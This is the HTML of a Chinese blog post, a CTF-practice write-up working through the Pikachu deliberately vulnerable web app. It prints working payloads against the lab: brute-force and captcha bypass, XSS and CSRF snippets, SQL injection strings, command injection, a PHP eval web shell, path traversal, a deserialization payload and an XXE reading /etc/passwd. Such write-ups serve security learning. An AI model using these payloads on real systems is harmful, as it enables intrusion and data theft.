@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://guo.moe/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://guo.moe/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guo.moe","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="此文章为 Klee-CTF 专题  准备资料弱密码资料：https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;tree&#x2F;master&#x2F;Passwords&#x2F;Common-Credentials 暴力破解基于表单的破解使用 burpsuite ，一般用户名使用admin，密码可以通过burpsuite破解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Klee-CTF】 Pikachu 漏洞练习">
+<meta property="og:url" content="https://guo.moe/archives/Pikachu-exercise.html">
+<meta property="og:site_name" content="果果说">
+<meta property="og:description" content="此文章为 Klee-CTF 专题  准备资料弱密码资料：https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;tree&#x2F;master&#x2F;Passwords&#x2F;Common-Credentials 暴力破解基于表单的破解使用 burpsuite ，一般用户名使用admin，密码可以通过burpsuite破解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%201.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%202.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%203.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%204.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%205.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%209.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2010.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2011.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2012.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2013.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2014.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2015.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2016.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2017.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2018.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2019.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2020.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2021.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2022.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2023.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2024.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2025.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2026.png">
+<meta property="og:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled%2027.png">
+<meta property="article:published_time" content="2021-07-29T04:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-30T12:28:36.000Z">
+<meta property="article:author" content="Guoguo">
+<meta property="article:tag" content="果果说">
+<meta property="article:tag" content="果果的博客">
+<meta property="article:tag" content="Guoguo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guo.moe/archives/Pikachu-exercise/Untitled.png">
+
+<link rel="canonical" href="https://guo.moe/archives/Pikachu-exercise.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【Klee-CTF】 Pikachu 漏洞练习 | 果果说</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-69554402-1"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-69554402-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="果果说" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">果果说</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Guoguo's Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/links/" rel="section"><i class="fa fa-user fa-fw"></i>友情链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guo.moe/archives/Pikachu-exercise.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guo.moe/favicon.jpg">
+      <meta itemprop="name" content="Guoguo">
+      <meta itemprop="description" content="找不到路，就自己走一条出来。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="果果说">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Klee-CTF】 Pikachu 漏洞练习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-07-29 12:00:00" itemprop="dateCreated datePublished" datetime="2021-07-29T12:00:00+08:00">2021-07-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-30 20:28:36" itemprop="dateModified" datetime="2021-08-30T20:28:36+08:00">2021-08-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E6%8A%80%E6%9C%AF%E7%AF%87/" itemprop="url" rel="index"><span itemprop="name">技术篇</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>此文章为 Klee-CTF 专题</p>
+</blockquote>
+<h1 id="准备资料"><a href="#准备资料" class="headerlink" title="准备资料"></a>准备资料</h1><p>弱密码资料：<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials">https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials</a></p>
+<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的破解"><a href="#基于表单的破解" class="headerlink" title="基于表单的破解"></a>基于表单的破解</h2><p>使用 burpsuite ，一般用户名使用admin，密码可以通过burpsuite破解</p>
+<span id="more"></span>
+
+<p><img data-src="Pikachu-exercise/Untitled.png" alt="Pikachu-exercise/Untitled.png"></p>
+<p>首先输入 admin admin 构造一个请求</p>
+<p><img data-src="Pikachu-exercise/Untitled%201.png" alt="Pikachu-exercise/Untitled%201.png"></p>
+<p><img data-src="Pikachu-exercise/Untitled%202.png" alt="Pikachu-exercise/Untitled%202.png"></p>
+<p><img data-src="Pikachu-exercise/Untitled%203.png" alt="Pikachu-exercise/Untitled%203.png"></p>
+<p>清除一下无关参数，只保留 password</p>
+<p>回到burpsuite，发现有一个payload的长度明显有点问题</p>
+<p><img data-src="Pikachu-exercise/Untitled%204.png" alt="Pikachu-exercise/Untitled%204.png"></p>
+<p>输入测试，诶成了</p>
+<p><img data-src="Pikachu-exercise/Untitled%205.png" alt="Pikachu-exercise/Untitled%205.png"></p>
+<h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过 (on server)"></a>验证码绕过 (on server)</h2><p>对网络请求，提取出关键，发现当且仅当访问 <a target="_blank" rel="noopener" href="http://172.16.40.2/pikachu/inc/showvcode.php">http://172.16.40.2/pikachu/inc/showvcode.php</a> 时，验证码才会发生改变，连续curl以下内容时，验证码是始终保持有效的</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://172.16.40.2/pikachu/vul/burteforce/bf_server.php&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;Cookie: PHPSESSID=8768b544b64dd8fc234b2b936c37c4ab; KOD_SESSION_ID=95908a94410cbb3970b38095670462ca; CSRF_TOKEN=xRTn99HD7XY3BFEs&#x27;</span> \</span><br><span class="line">  --data-raw <span class="string">&#x27;username=admin&amp;password=admin&amp;vcode=gynqsw&amp;submit=Login&#x27;</span> \</span><br><span class="line">  --compressed</span><br></pre></td></tr></table></figure>
+
+<p>接下来的操作步骤和上面一致。</p>
+<h1 id="反射型xss（get）-存储型xss"><a href="#反射型xss（get）-存储型xss" class="headerlink" title="反射型xss（get）/ 存储型xss"></a>反射型xss（get）/ 存储型xss</h1><p><a target="_blank" rel="noopener" href="http://192.168.44.128:8080/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(1)%3C/script%3E&submit=submit#"><code>http://192.168.44.128:8080/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit#</code></a></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000021899373">https://segmentfault.com/a/1190000021899373</a></p>
+<p>在message内写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%206.png](Pikachu-exercise/Untitled%206.png)</span><br><span class="line"></span><br><span class="line"># DOM 型 xss/DOM 型 xss-x</span><br><span class="line"></span><br><span class="line">1. 在框内输入 `javascript:alert(1)` ，点击链接触发</span><br><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%207.png](Pikachu-exercise/Untitled%207.png)</span><br><span class="line"></span><br><span class="line">1. 在本页面不做任何操作就触发</span><br><span class="line"></span><br><span class="line">尝试：</span><br><span class="line"></span><br><span class="line">- `&#x27; &gt;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&gt;` 结果看页面是有了，但是没法弹出来</span><br><span class="line">- `&#x27;onmousemove=&quot;alert(1)&quot;` 在链接上移动触发</span><br><span class="line"></span><br><span class="line">![Pikachu-exercise/Untitled%208.png](Pikachu-exercise/Untitled%208.png)</span><br><span class="line"></span><br><span class="line"># CSRF(get)/CSRF(post)</span><br><span class="line"></span><br><span class="line">该链接修改信息参数都放在url上，所以要修改可以直接从url下手</span><br><span class="line"></span><br><span class="line">```jsx</span><br><span class="line">http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php?sex=2&amp;phonenum=2&amp;add=2&amp;email=2&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>可修改 sex，phonenum，add等参数，并通过ajax无感知地修改用户的数据。不行就整个链接嘛，或者window.open</p>
+<p>直接javascript，</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&quot;http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php?sex=2&amp;phonenum=2&amp;add=2&amp;email=2&amp;submit=submit&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>post同理，可以用form构造</p>
+<p>网站源码？拿来吧你，随便找个html套上然后改一下这个action为目标页面就可</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;http://192.168.44.128:8080/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span><br><span class="line">   <span class="xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,,欢迎来到个人会员中心 | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;csrf_post.php?logout=1&quot;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">   <span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>姓名:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">   &lt;p class=&quot;per_sex&quot;&gt;性别:&lt;input type=&quot;text&quot; name=&quot;sex&quot; value=&quot;&quot;&gt;&lt;/p&gt;</span><br><span class="line">   &lt;p class=&quot;per_phone&quot;&gt;手机:&lt;input class=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;&quot;&gt;&lt;/p&gt;    </span><br><span class="line">   &lt;p class=&quot;per_add&quot;&gt;住址:&lt;input class=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;&quot;&gt;&lt;/p&gt; </span><br><span class="line">   &lt;p class=&quot;per_email&quot;&gt;邮箱:&lt;input class=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;&quot;&gt;&lt;/p&gt; </span><br><span class="line">   &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>输入 <code>a&#39; or 1=1 #</code> 即可匹配所有用户， <code>%%</code> 也行，%是通配符</p>
+<p><img data-src="Pikachu-exercise/Untitled%209.png" alt="Pikachu-exercise/Untitled%209.png"></p>
+<h1 id="基于-boolian-的盲注"><a href="#基于-boolian-的盲注" class="headerlink" title="基于 boolian 的盲注"></a>基于 boolian 的盲注</h1><p>当你已经知道了数据库中存在一个为kobe的用户，这里相当于一个判断语句只能给你返回是或否，注入可以利用其判断语句+判断字符来判断其完整字符串。</p>
+<p>比如此处输入 <code>kobe</code>，可以正常地返回其信息</p>
+<p>而输入 <code>kobe&#39; and 1=1#</code> 也可以， <code>kobe&#39; and 1=2#</code> 就不行了</p>
+<p>但其他 MySQL 语句还是可以执行的嘛！不知道其他信息，靠判断猜！</p>
+<p>比如说，MySQL里面有select, substr, ascii等语句，可以通过逐字符判断来判断其数据库名</p>
+<h1 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h1><p>原理其实和上面差不多，也是利用信息来判断信息，只不过这里利用的是睡眠时间，使用判断条件+sleep(x)，满足条件的时候睡眠x秒</p>
+<p><code>1&#39; or sleep(3)#</code> 来测试，<code>sleep()</code>可用</p>
+<p>比如说我们在数据库中使用 <code>select if (database()=&#39;pikachu&#39;, sleep(5), 1)</code> ，使用了五秒，可以判断当前数据库名称为 <code>pikachu</code></p>
+<h1 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h1><p>笑死，他的docker上没有ping，但是其他命令可以执行</p>
+<p><code>;whoami;ls;pwd</code> ，是没有对输入ip进行过滤</p>
+<p><img data-src="Pikachu-exercise/Untitled%2010.png" alt="Pikachu-exercise/Untitled%2010.png"></p>
+<h1 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h1><p>我这里没开 allow_url_include，所以就不演示了，但远程可以构造一个txt文件，里面写</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	<span class="built_in">eval</span>($_GET[<span class="string">&#x27;x&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="Pikachu-exercise/Untitled%2011.png" alt="Pikachu-exercise/Untitled%2011.png"></p>
+<h1 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h1><p>查看链接格式</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=kb.png">http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=kb.png</a></p>
+<p>容易得知这个filename可以利用，修改为execdownload.php，404，应该图片被放在子目录了，那就修改为../execdownload.php，成功获取</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=../execdownload.php">http://192.168.44.128:8080/vul/unsafedownload/execdownload.php?filename=../execdownload.php</a></p>
+<p><img data-src="Pikachu-exercise/Untitled%2012.png" alt="Pikachu-exercise/Untitled%2012.png"></p>
+<h1 id="Unsafe-Fileupload→client-check"><a href="#Unsafe-Fileupload→client-check" class="headerlink" title="Unsafe Fileupload→client check"></a>Unsafe Fileupload→client check</h1><p>F12 直接把这个去掉，好像不行</p>
+<p><img data-src="Pikachu-exercise/Untitled%2013.png" alt="Pikachu-exercise/Untitled%2013.png"></p>
+<p>用burpsuite拦截响应请求把这个给去掉，重新上传，getdaze</p>
+<p><img data-src="Pikachu-exercise/Untitled%2014.png" alt="Pikachu-exercise/Untitled%2014.png"></p>
+<p><img data-src="Pikachu-exercise/Untitled%2015.png" alt="Pikachu-exercise/Untitled%2015.png"></p>
+<h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><p>查看提示，使用 pikachu/000000 登录，发现只有查看权限</p>
+<p><img data-src="Pikachu-exercise/Untitled%2016.png" alt="Pikachu-exercise/Untitled%2016.png"></p>
+<p>使用admin/123456登录，发现有添加权限，地址为</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.44.128:8080/vul/overpermission/op2/op2_admin_edit.php">http://192.168.44.128:8080/vul/overpermission/op2/op2_admin_edit.php</a></p>
+<p>回到pikachu，同样访问上面地址，发现可以正常访问</p>
+<p><img data-src="Pikachu-exercise/Untitled%2017.png" alt="Pikachu-exercise/Untitled%2017.png"></p>
+<p>也可以正常添加</p>
+<h1 id="→目录遍历"><a href="#→目录遍历" class="headerlink" title="../../→目录遍历"></a>../../→目录遍历</h1><p>用了哪些函数类型？</p>
+<p>随便点击一个，发现地址有关键字 <code>xxx.php</code></p>
+<p><img data-src="Pikachu-exercise/Untitled%2018.png" alt="Pikachu-exercise/Untitled%2018.png"></p>
+<p>作死试试 <code>../../../index.php</code> ，笑死，还套娃了</p>
+<p><img data-src="Pikachu-exercise/Untitled%2019.png" alt="Pikachu-exercise/Untitled%2019.png"></p>
+<h1 id="敏感信息泄露→IcanseeyourABC"><a href="#敏感信息泄露→IcanseeyourABC" class="headerlink" title="敏感信息泄露→IcanseeyourABC"></a>敏感信息泄露→IcanseeyourABC</h1><p>F12查看，嚯哟这有个账号</p>
+<p><img data-src="Pikachu-exercise/Untitled%2020.png" alt="Pikachu-exercise/Untitled%2020.png"></p>
+<p><img data-src="Pikachu-exercise/Untitled%2021.png" alt="Pikachu-exercise/Untitled%2021.png"></p>
+<p>登陆成功</p>
+<h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h1><p>构造PHP payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> s();</span><br><span class="line"><span class="variable">$a</span>-&gt;test = <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>不过我猜测，这个类名和参数名有一个没猜对都没法用吧？</p>
+<p><img data-src="Pikachu-exercise/Untitled%2022.png" alt="Pikachu-exercise/Untitled%2022.png"></p>
+<p><img data-src="Pikachu-exercise/Untitled%2023.png" alt="Pikachu-exercise/Untitled%2023.png"></p>
+<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>我看不懂，但我大受震撼.jpg</p>
+<p>参考资料 <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/265859.html">https://www.freebuf.com/vuls/265859.html</a></p>
+<p>根据文章，可以构造一个这样的恶意payload来获取任意文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="Pikachu-exercise/Untitled%2024.png" alt="Pikachu-exercise/Untitled%2024.png"></p>
+<p>然后可以获取到 /etc/passwd 的内容了</p>
+<h1 id="URL-重定向"><a href="#URL-重定向" class="headerlink" title="URL 重定向"></a>URL 重定向</h1><p>@某佛大SSO</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.44.128:8080/vul/urlredirect/urlredirect.php?url=https://baidu.com">http://192.168.44.128:8080/vul/urlredirect/urlredirect.php?url=https://baidu.com</a></p>
+<h1 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h1><p>这个curl可以用作访问仅限内网访问的应用，比如docker之间</p>
+<p><img data-src="Pikachu-exercise/Untitled%2025.png" alt="Pikachu-exercise/Untitled%2025.png"></p>
+<h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><ul>
+<li><p>搜索型注入中 两个%是为了闭合，补充union等知识（比赛时一般都只能手工注入）</p>
+<p>  <img data-src="Pikachu-exercise/Untitled%2026.png" alt="Pikachu-exercise/Untitled%2026.png"></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.yuque.com/docs/share/a9f3ca4d-b032-46ab-ad68-459e0177d911#37039777">https://www.yuque.com/docs/share/a9f3ca4d-b032-46ab-ad68-459e0177d911?#37039777</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.yuque.com/docs/share/6d18cc14-f0de-4b5f-aebe-6543304e48b1#">https://www.yuque.com/docs/share/6d18cc14-f0de-4b5f-aebe-6543304e48b1?#</a></p>
+</li>
+<li><p>XSS 是怎么实现反弹的</p>
+<p>  实例源码：<a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2020/oStyle/bot.py">https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2020/oStyle/bot.py</a></p>
+  <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">client = webdriver.Chrome(<span class="string">&#x27;./chromedriver&#x27;</span>, chrome_options=chrome_options)</span><br><span class="line"></span><br><span class="line">client.add_cookie(&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;this-is-for-you&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: FLAG, </span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>  一般可以通过 chromedriver 模拟访问来实现 xss 反弹，在访问的时候添加上 cookie 里的 flag</p>
+</li>
+<li><p>PHP 反序列化 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p>
+<p>  <img data-src="Pikachu-exercise/Untitled%2027.png" alt="Pikachu-exercise/Untitled%2027.png"></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
